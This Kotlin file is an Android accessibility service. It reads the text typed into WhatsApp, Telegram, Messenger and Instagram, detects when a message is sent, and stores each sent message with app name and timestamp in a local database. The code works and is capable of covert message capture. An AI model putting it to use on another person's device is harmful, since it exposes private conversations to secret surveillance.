package com.spawn.capture.service

import android.accessibilityservice.AccessibilityService
import android.os.SystemClock
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.spawn.capture.data.AppDatabase
import com.spawn.capture.data.CapturedEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class SentMessageCaptureService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val dao by lazy { AppDatabase.get(this).eventDao() }

    private val messengers = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "com.facebook.orca",
        "com.instagram.android"
    )

    private var pendingText: String? = null
    private var pendingPackage: String? = null
    private var lastCheck = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in messengers) return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val source = event.source ?: return
                if (!source.isEditable) return
                val text = event.text.joinToString("").trim()
                if (text.isNotEmpty()) {
                    pendingText = text
                    pendingPackage = pkg
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val desc = event.contentDescription?.toString()?.lowercase() ?: ""
                val label = event.text.joinToString(" ").lowercase()
                val isSendButton = desc.contains("send") || desc.contains("enviar") ||
                    label.contains("send") || label.contains("enviar")
                if (isSendButton) savePending()
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (pendingText == null) return
                val now = SystemClock.elapsedRealtime()
                if (now - lastCheck < 400) return
                lastCheck = now
                val root = rootInActiveWindow ?: return
                val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                val current = focused?.text?.toString().orEmpty()
                if (focused == null || !focused.isEditable || current.isBlank()) {
                    savePending()
                }
            }
        }
    }

    private fun savePending() {
        val text = pendingText ?: return
        val pkg = pendingPackage
        pendingText = null
        pendingPackage = null
        if (text.isBlank() || pkg == null) return
        val event = CapturedEvent(
            packageName = pkg,
            direction = "SENT",
            title = null,
            text = text,
            timestamp = System.currentTimeMillis()
        )
        scope.launch { dao.insert(event) }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
